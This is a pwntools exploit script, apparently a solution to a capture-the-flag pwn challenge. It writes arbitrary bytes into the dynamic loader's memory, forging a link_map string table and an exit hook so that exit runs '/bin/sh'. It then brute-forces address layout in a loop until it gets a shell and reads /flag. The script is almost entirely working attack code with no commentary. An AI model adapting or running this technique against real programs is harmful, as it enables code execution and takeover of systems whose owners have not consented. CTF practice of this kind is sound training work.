#!/usr/bin/env python3
from pwn import *

# context.log_level = "debug"
p_addr = lambda name, addr: print(f"{name}: {hex(addr)}")
ru = lambda s: p.recvuntil(s)
rut = lambda s, t: p.recvuntil(s, timeout=t)
r = lambda n: p.recv(n)
sla = lambda d, b: p.sendlineafter(d, b)
sa = lambda d, b: p.sendafter(d, b)
sl = lambda s: p.sendline(s)
sls = lambda s: p.sendline(str(s).encode())
ss = lambda s: p.send(str(s).encode())
s = lambda s: p.send(s)
uu64 = lambda data: u64(data.ljust(8, b"\x00"))
it = lambda: p.interactive()


def write_one(addr, data):
    tmp = b""
    for i in range(len(data)):
        tmp += p64(addr + i) + p8(data[i])
    return tmp


p = process("./pwn")
# io = remote("node4.buuoj.cn", 29129)
ld = 0x265000 - 0x10
# ld = 0x26b000 - 0x10
link_base_addr = ld + 0x1190
link_dyn_str = link_base_addr + 0x68
fake_str = ld + 0x1160
exit_hook = ld + 0xF68
exit_hook_rdi = ld + 0x968
write_st_name = 62

payload = b""

payload += p64(link_base_addr) + p8(0x18)

str_ = b"\x90\x62\xb6"
# str_ = b"\x90\x72\xe2"
payload += write_one(exit_hook, str_)

str_ = b"/bin/sh\x00"
payload += write_one(exit_hook_rdi, str_)

str_ = b"exit\x00"
payload += write_one(fake_str + write_st_name, str_)

payload += p64(link_dyn_str) + p8(0xB8)

count = 0
while True:
    try:
        p = process("./pwn")
        s(payload)
        sl(b"echo ok")
        p.recvuntil(b"ok")
        sl(b"cat /flag")
        p.interactive()
        break
    except Exception as e:
        p.close()
        count += 1
        print(count)
        continue


it()
